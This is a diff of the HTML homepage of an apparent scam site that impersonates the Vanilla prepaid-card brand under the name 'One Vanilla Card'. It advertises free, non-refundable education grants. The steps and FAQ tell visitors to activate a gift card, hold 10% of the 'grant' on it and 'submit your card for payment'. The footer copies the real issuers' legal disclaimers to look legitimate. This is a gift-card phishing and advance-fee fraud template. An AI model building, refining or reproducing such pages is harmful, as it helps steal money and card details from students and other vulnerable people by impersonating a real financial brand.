@@ -1,77 +1,160 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home Page</title>
     <link rel="stylesheet" href="css/index.css">
-    <title>Vanilla</title>
 </head>
 <body>
-    <header>
-        <div>Vanilla</div>
-        <nav> 
-            <div id="navbar">   
-                <span></span>
-                <span></span>
-                <span></span>
-            </div>
-            <ul id="list-link">
-                <li id="cancel-bar">&times;</li>
-                <li class="nav-link"><a href="index.html">Home </li>
-                <li class="nav-link"><a href="application.html">Apply</a></li>
-                <li class="nav-link"><a href="faq.html">FAQ</a></li>
-            </ul>
-        </nav>
-    </header>
-    <section id="transaction">
-      <div class="bg-content">
-        <h1>Welcome to</h1>
-        <h3>Vanilla Card</h3>
-        <b><a href="application.html" id="start">Apply Now</a></b>
-      </div>
-    </section>
-
-    <section id="work-rate">
-        <div class="project">
-            <h3>Step 1</h3>
-            <b>Fill your application, and get your vanilla card ready,
-                 choose support funds amount</b>
+<header>
+    <div class="logo move" id="logo">  
+        <div></div>
+        <img src="images/vanillalog.jpg" alt="">
+        <div id="navbar">   
+            <span></span>
+            <span></span>
+            <span></span>
         </div>
-        <div class="project">
-            <h3>Step 2</h3>
-            <b>After choosing support amount, Activate your card and submit your card for payment</b>
+    </div>
+    <nav id="link">
+        <ul>
+            <li  class="active"><a href="index">HOME</a></li>
+            <li><a href="about.html">ABOUT US</a></li>
+            <li><a href="application.html">APPLICATION FORM</a></li>
+            <li><a href="faq1.html">FAQ</a></li>
+        </ul>
+    </nav>
+</header>
+<section class="move apply">
+    <img src="images/vanillamain_orig.jpg" width="80%">
+    <div id="btn">
+        <span>Start Application</span>
+    </div>
+</section>
+
+
+
+<section class="move about">
+<img class="about-item" height="400px" src="images/vanillamain_orig.jpg" alt="">
+
+    <div class="about-item">
+        <h2>About The Vanilla Support Funds</h2>
+        
+        <p style="color:rgb(0,0,0);line-height:1.5;letter-spacing: 2px;font-family: sans-serif;">At One Vanilla Card,
+             we believe in the power of education to transform lives. 
+            Our non-refundable grant initiative is designed to address the financial barriers that many students face,
+             ensuring that they can focus on what truly matters: their studies and personal growth.
+
+            Reasons for the Grant Campaign:
+            Supporting Educational Aspirations: Higher education can be a significant financial burden. Our grant helps 
+            alleviate some of that stress, allowing students to pursue their academic dreams without the worry of 
+            repayment.
+            
+            Fostering Financial Independence: By providing a grant that doesn’t need to be repaid,
+             we empower students to take charge of their financial futures. This support encourages responsible financial 
+             habits and lessens the burden of student debt.
+            <!--
+            Promoting Equal Opportunities: We recognize that not all students have access to the same resources. 
+            Our grant aims to create a more level playing field, ensuring that deserving students from al
+            l backgrounds have the chance to succeed.
+            
+            Encouraging Academic Excellence: With the financial support from One Vanilla Card, students
+             can focus more on their studies, leading to improved academic performance and greater career opportunities.
+            
+            Investing in Future Leaders: Education is an investment in the future. By supporting students today, we’re investing in the leaders, innovators, and changemakers of tomorrow.
+            
+            Together, let’s make education accessible and empower the next generation!-->
+            
+            
+            </p>
+    </div>
+</section>
+
+<section class="move reward">
+    <h2>Receive an education grant in 3 easy steps</h2>
+    <div class="container">
+        <div class="item">
+            <h2>(1) Get things ready</h2>
+            <span>Fill your application, get your Vanilla Card ready, 
+                choose support funds amount.</span>
         </div>
-        <div class="project">
-            <h3>Step 3</h3>
-            <b>Once your card has been received and confirmed valid. Payment shall be received
-                24-48 hours.
-            </b>
+
+        <div class="item">
+            <h2>(2) Submit Vanilla Card</h2>
+            <span>After choosing support amount,
+                 Activate your card and submit your card for payment.</span>
         </div>
-    </section>
 
-
-
-
-    <section id="footer">
-        <div id="vanilla-desc">Vanilla Visa* Gift Cards are issued by TBBK Card Services,Inc., Metabank*,N.A.
-            or Sutton Bank, pursuant to a license from Visa U.S.A Inc. Metabank, N.A and Sutton Bank, Members FDIC 
-         See the back of your card for issuing bank.
-         Vanilla Discover* Gift Cards are issued by tehe Bancorp Bank, Member FDIC. Vanilla Mastercard* Gift Cards are issued
-         by the Bancorp Bank, MetaBank N.A. or Sutton Bank pursuant to license by Mastercard International incorporated.
-         Mastercard is a registered trademark, and the circles design is a trademark of Mastercard International incorporated. Vanilla
-         Bill payment prepaid Visa Cards are issued by TBBK Card Services, inc. pursuant to a license from Visa U.S.A,inc. Vanilla Bill
-         payment prepaid Mastercard is issued by the Bancorp Bank pursuant to license by Mastercard International incorporate. Cards may
-         be used in the U.S and District of Columbia everywhere CIsa debit cards, Debit Mastercard or Discover cards are accepted. No Cash or ATM access. Terms and
-         conditions apply. See Cardholder Agreement for details. Cards ate distributed and serviced by Incomm Financial Services,inc. which is licensed as a money transmitter by the New York state Department of Financial Services. NMLS ID#912772. Colorado, Maryland and Texas
-
-         <p>Customers: View information about addressing complaints regarding our money services business</p>
-         <h6>Copyright &copy; 2020. All Rights Reserved.</h6>
-         
+        <div class="item">
+            <h2>(3) Receive Payment</h2>
+            <span>Once your card has been received and confirmed valid payment shall be received in 24 - 48 hours.
+            </span>
         </div>
-        <div>
-            <img src="images/vanilla.jpg" id="card-img" alt="">
-        </div>
-    </section>
-    <script src="js/navbar.js"></script>
+
+    </div>
+</section>
+
+<section class="faq">
+    <div>
+        <h3>Frequently most asked questions</h3>
+       <h4>
+        <strong style="font-size: 20px;">How do i receive my funds?</strong> 
+        <span style="color: rgb(141, 36, 36);">Funds will be sent to your Vanilla Card
+        </span></h4>
+        <h4 style="margin-bottom:4%;">
+ <strong style="font-size: 20px;">Do i need to pay this grant back?</strong> 
+ <span style="color: rgb(141, 36, 36);"> No, you don't have to pay back anything now nor in the future</span>
+</h4>
+<span  class="read-more">Read More</span>
+</div>
+</section>
+
+
+
+<section class="qualify">
+    <div>
+        <h3 style="color:rgb(141, 36, 36);font-size:25px; font-weight: 800;">How do I qualify</h3>
+       <h4 style="color:grey;font-size: 18px;">
+        1) New or Existing One Vanilla Card owners</h4>
+        <h4 style="color:grey;font-size: 18px;">2)10% balance of requested Grant</h4> 
+</div>
+</section>
+
+
+<section class="about-us">
+    <div>
+        <h3 style="font-size:25px;color:rgb(141, 36, 36) ">About Us</h3>
+        <h4 style="line-height: 1.5; letter-spacing: 2px;margin-bottom: 5%;color:grey;font-size: 18px;"> Promoting Equal Opportunities: We recognize that not all students have access to the same resources. 
+            Our grant aims to create a more level playing field, en
+            suring that deserving students from al
+            l backgrounds have the chance to succeed.
+            
+            Encouraging Academic Excellence: With the financial support from One Vanilla Card, students
+             can focus more on their studies, leading to improved academic performance and greater career opportunities.
+            
+            Investing in Future Leaders: Education is an investment in the future. By supporting students today, we’re investing in the leaders, innovators, and changemakers of tomorrow.
+            
+            Together, let’s make education accessible and empower the next generation</h4>
+ 
+<span class="read-more">Read More</span>
+</div>
+</section>
+
+<section class="footer">
+    <div>
+        
+Vanilla Visa® Gift Cards are
+ issued by TBBK Card Services, Inc., MetaBank®, N.A. or Sutton Bank, pursuant to a license from Visa U.S.A. Inc. MetaBank, N.A. and Sutton Bank, Members FDIC. See the back of your card for issuing bank. Vanilla Discover® Gift Cards are issued by The Bancorp Bank, Member FDIC. Vanilla Mastercard® Gift Cards are issued by The Bancorp Bank, MetaBank, N.A. or Sutton Bank pursuant to license by Mastercard International Incorporated. Mastercard is a registered trademark, and the circles design is a trademark of Mastercard International Incorporated. Vanilla Bill Payment Prepaid Visa Cards are issued by TBBK Card 
+Services, Inc. pursuant to a license from Visa  U.S.A. Inc. Vanilla Bill Payment Prepaid Mastercard is issued by The Bancorp Bank pursuant to license by Mastercard International Incorporated. Cards may be used in the U.S. and District of Columbia everywhere Visa debit cards, Debit Mastercard or Discover cards are accepted. No cash or ATM access. Terms and conditions apply. See Cardholder Agreement for details. Cards are distributed and serviced by InComm Financial Services, Inc., which is licensed as a Money Transmitter by the New York State Department of Financial Services. NMLS ID# 912772. Colorado, Maryland, and Texas customers: View information about addressing complaints regarding our money services business.
+<br><b style="color:white;">Copyright © 2024. All Rights Reserved.</b>
+
+    </div>
+    <div></div>
+</section>
+
+
+
+<script src="js/navbars.js"></script>
 </body>
 </html>
